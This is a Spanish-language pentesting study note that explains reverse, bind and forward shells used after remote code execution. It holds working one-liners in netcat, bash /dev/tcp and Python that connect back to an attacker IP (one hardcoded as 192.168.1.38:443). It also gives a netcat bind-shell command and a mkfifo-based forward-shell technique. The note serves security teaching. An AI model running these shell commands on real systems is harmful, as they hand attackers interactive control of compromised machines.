-----------
- Tags: #explotación #basico #teoria
---

# Reverse Shell

Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, premitiéndole tomar el control de la máquina remota. 

En el ejemplo de la imagen, supongamos que la maquina victima tiene expuesto un puerto :80, con un servicio de apache2, el cual, es vulnerable a **RCE** (Remote Code Execution), una vez pudiendo ejecutar comandos como la maquina victima, al atacante le interesaria enviarse una consola interactiva por un puerto que el decida.

![[reverseShell.png|1000]]

Algunos oneliners típicos para lograr esto son:

- #### Haciendo uso de net cat:
```shell
ncat -e /bin/bash {IP_atacante} {puerto}
```

- #### Haciendo uso de bash:
```shell
bash -i >& /dev/tcp/{IP_atacante}/{puerto} 0>&1 
```

- #### Haciendo uso de python: 
```python 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.38",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
#### Más oneliners [aca](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

---
# Bind Shell 

Esta técnica es el opuesto de la **Reverse Shell**, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante por ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma. 

En este caso, en el ejemplo de la imagen, el atacante al explotar el **RCE**, inyecta un comando malicioso, en este ejemplo `nc -nlvp 443 -e /bin/bash` que lo que hace es escuchar en el puerto 443 por conexiones, y cuando reciba una, otorgara la consola interactiva.

![[BindShell.png|1000]]

-----------
# Forward Shell 

Esta técnica puede llegar aser utilizada cuando no se pueden establecer conexiones *Reverse* o *Bind* debido a posibles reglas de Firewall implementadas en la red u otro tipo de limitaciones. Esto podría lograrse haciendo uso de [[Named and Unnamed Pipes]] (*Named Pipes*), creando un archivo **FIFO** el cual recibirá constantemente los comandos que querramos ejecutar y enviará el output de los mimos a un archivo alojado en un determinado path. De esta manera, abusando del concepto que trae los pipes y la comunicación bidireccional. 

Creando un *Named Pipe* llamado *input*, el cual estaremos filtrando sus últimas líneas para reenviarlas a un archivo llamado *output*:

```shell
mkfifo /tmp/input; tail -f /tmp/input | /bin/bash 2>&1 > /tmp/output 
```

De esta manera, el ejecutar este comando veríamos que el mismo se queda en ejecución y en el directorio /tmp se crearía un archivo **FIFO** con el nombre *input*, la ídea es una vez llegado a este punto, envíar los comandos que deseemos ejecutar para que los mismos sean interpretados por un *unamed pipe* ( **|** ) y ejecutados por una */bin/bash* transformando el *stderr* a *stdout* yr alojadar el output de estos comandos en el archivo *output*. 

```shell
echo "whoami" > /tmp/input
echo "script /dev/null -c bash" > /tmp/input
echo "id" > /tmp/input

cat /tmp/output
# ──────┬───────────────────────────
#       │ File: /tmp/output
# ──────┼────────────────────────
#   1   │ kali    
#   2   │ Script started, output log file is '/dev/null'.
#   3   │ id
#   4   │ kali@kali: /tmp^G┌──(kali㉿kali)-[/tmp]
#   5   │ └─$ id
#   6   │ ^Muid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),106(bluetooth),113(s
#       │ canner),135(wireshark),137(kaboxer)
#   7   │ 
#   8   │ ali@kali: /tmp^G┌──(kali㉿kali)-[/tmp]
#   9   │ └─$ 
# ──────┴────────────────────────────────────────────────────
```

 En el archivo */etc/output* podemos ver en la línea 1, el output del comando *whoami*, el la línea 2 el lanzamiento de la pseudo consola como indicamos en el segundo comando (*script /dev/null -c bash*), en la línea 4 podemos ver la pseudo consola con el comando que indicamos y recien en la línea 6 podemos ver la ejecución del comando *id* que envíamos.

De igual manera existen herramientas como [forward_shell.py](https://github.com/Dobliuw/MyHackingTools/blob/master/forward_shell.py) las cuales se encargan de explotar esta técnica para escenarios en donde dispongamos de una web vulnerable con [[RCE - (Remote Command Execution)]], permitiendonos de esta manera convertir una web shell en una "terminal interactiva" simulada haciendo uso de [[Named and Unnamed Pipes]]. 